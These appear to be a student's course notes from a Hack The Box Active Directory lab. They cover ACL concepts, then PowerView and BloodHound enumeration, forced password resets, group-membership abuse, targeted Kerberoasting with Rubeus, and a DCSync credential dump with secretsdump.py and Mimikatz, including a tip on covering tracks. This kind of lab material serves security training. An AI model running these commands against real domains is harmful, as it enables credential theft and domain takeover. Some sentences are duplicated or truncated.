--- ---

<h2>Overview</h2>

- ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned.
	- Settings themselves are called Access Control Entities (ACEs)
	- Each ACE maps back to a user, group, or process

There are two types of ACLs:
1. Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.

2. System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.

![[Pasted image 20230102202038.png]]

![[Pasted image 20230102202058.png]]

Three main types of ACEs:
| Ace                | Description                                                                               |
| ------------------ | ----------------------------------------------------------------------------------------- |
| Access denied ACE  | Used within a DACL to show that a user or group is explicitly denied access to an object  |
| Access allowed ACE | Used within a DACL to show that a user or group is explicitly granted access to an object |
| System audit ACE   | Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurr

Each ACE is made up of the following four components:
1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An acce

![[Pasted image 20230102202542.png]]

1. The security principal is Angela Dunn (adunn@inlanefreight.local)
2. The ACE type is Allow
3. Inheritance applies to the "This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted
4. The rights granted to the object, again shown graphically in this example

Common ACLs that can be abused:
![[Pasted image 20230102202649.png]]

Four Ones to Abuse in this Course:
• **ForceChangePassword**: gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).

• **GenericWrite**: gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.

• **AddSelf**: shows security groups that a user can add themselves to.

• **GenericAll**: this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If wehave this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if wehave this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

ACL Abuse Map
![[Pasted image 20230102203111.png]]

Common attack scenarios:
![[Pasted image 20230102203143.png]]

---

<h2>ACL Enumeration</h2>

Enumerating ACLs with Powerview
Targeting a Specific User with "Find-InterestingDomainAcl"
```
PS C:\htb> Import-Module
.\PowerView.ps1
PS C:\htb> $sid = Convert-
NameToSid wley
```

Using Get-DomainObjectACL
```
PS C:\htb> Get-DomainObjectACL -Identity * | ?
{$_.SecurityIdentifier -eq $sid}
```
![[Pasted image 20230102204115.png]]
We could Google for the GUID value 00299570-246d-11d0-a768-00aa006e0529 and uncover this page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

Performing a Reverse Search & Mapping to a GUID Value
```
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-
ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -
Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} |
fl
```
![[Pasted image 20230102204306.png]]

Using the -ResolveGUIDs Flag (more efficient)
```
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ?
{$_.SecurityIdentifier -eq $sid}
```

Doing It Manually with Powershell AD Tools:
1. Create a List of Domain Users
```
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty
SamAccountName > ad_users.txt
```
2. Create a "foreach" loop
```
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt"))
{get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object
{$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

So, to recap, we started with the user wley and now have control over the user damundsen via theUser-Force-Change-Password extended right. Let's use Powerview to hunt for where, if anywhere,
control over the damundsen account could take us.

Further Enumeration Using damundsen
```
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier
-eq $sid2} -Verbose
```

![[Pasted image 20230102204753.png]]
- damundsen has GenericWrite privileges over the "Help Desk Level 1" group
- We can add any user (or ourselves) to this group and inherit group rights

Investigating "Help Desk Level 1" Group with Get-DomainGroup
```
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" |
select memberof
```

![[Pasted image 20230102204853.png]]

A quick search shows us that the Help Desk Level 1 group is nested into the Information Technology group, meaning that we can obtain any rights that the Information Technology group grants to its members if we just add ourselves to the Help Desk Level 1 group where our user damundsen has GenericWrite privileges.

Investigating the Information Technology Group
```
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq
$itgroupsid} -Verbose
```

![[Pasted image 20230102205222.png]]
- GenericAll rights over the user adunn, which means we could:
	- Modify group membership
	- Force change a password
	- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak

Looking for Access with "adunn" account
```
PS C:\htb> $adunnsid = Convert-NameToSid adunn
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq
$adunnsid} -Verbose
```

![[Pasted image 20230102205335.png]]
The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack.


<h3>Enumerating ACLs with Bloodhound</h3>
1. Upload the data to Bloodhound to be displayed.
2. Set the "wley" user as the starting node
3. Select the "Node Info" tab and scroll down to "Outbound Control Rights"
		a. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under Transitive Object Control.
		ㅤ
		b. If we click on the 1 next to First Degree Object Control, we see the first set of rights that we enumerated, ForceChangePassword over the damundsen user.

![[Pasted image 20230102205553.png]]

---

<h2>ACL Abuse Tactics</h2>

Recap/Context:
- Control of wley user
- We can use this user to kick off an attack chain to control adunn user
- adunn user can perform a DCSync attack

Attack Chain:
1. Use the wley user to change the password for the damundsen user
2. Authenticate as the damundsen user and leverage GenericAll rights to add a user that we control to the Help Desk Level 1 group
3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

Steps:
1. Authenticate as "wley" via a PSCredential Object
```
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object
System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

2. Create a SecureString Object to Represent the Password for damundsen
```
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!'
-AsPlainText -Force
```

3. Change damundsen's password with PowerView
```
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
Credential $Cred -Verbose
```

4. Authenticate as "damundsen" via a PSCredential Object
```
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object
System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

5. Add damundsen to the "Help Desk Level 1 Group" with Powershell
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -
Credential $Cred2 -Verbose
```

6. Rather than changing adunn's password, set can do a targeted kerberoast attack. Create a fake
```
SPN
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET
@{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

7. Kerberoast the adunn user with Rubeus
```
PS C:\htb> .\Rubeus.exe kerberoast
/user:adunn /nowrap
```

8. Crack the hash with hashcat and we now have access to the adunn user for a DC-Sync attack!


DCSync

What is DCSync?
DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

Requirements:
- Need an account with "Replicating Directory Changes" and "Directory Changes All" permissions set
- Domain/Enterprise Admins have this by default

1. Use Get-DomainUser to View Group Membership of user
```
PS C:\htb> Get-DomainUser -Identity adunn |select
samaccountname,objectsid,memberof,useraccountcontrol |fl
```

2. Using SID from above command, check if user has the rights for a DC-Sync attack
```
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {
($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select
AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
- If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks


Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py:
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc
INLANEFREIGHT/adunn@172.16.5.5
```
	- -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
	- -just-dc-ntlm flag if we only want NTLM hashes
	- -just-dc-user <USERNAME> to only extract data for a specific user.
	- -pwd-last-set to see when each account's password was last changed
	- -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client
	- -user-status is another helpful flag to check and see if a user is disabled.


Listing Hashes, Kerberos Keys, and Cleartext Passwords
```
TeneBrae93@htb[/htb]$ ls inlanefreight_hashes*
inlanefreight_hashes.ntds inlanefreight_hashes.ntds.cleartext
inlanefreight_hashes.ntds.kerberos
```
- If we check the files created using the -just-dc flag, we will see that there are three: onecontaining the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.

Enumerating Further To Check "Reversible Encryption Passwords" with Get-ADUser
```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties
userAccountControl
```

Enumerating Further To Check "Reversible Encryption Passwords" with Get-DomainUser (PowerView)
```
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like
'*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

Displaying the Decrypted Password
![[Pasted image 20230102210313.png]]


Performing the Attack with Mimikatz
1. Launch mimiktaz.exe
![[Pasted image 20230102210351.png]]
2. Type this command
![[Pasted image 20230102210407.png]]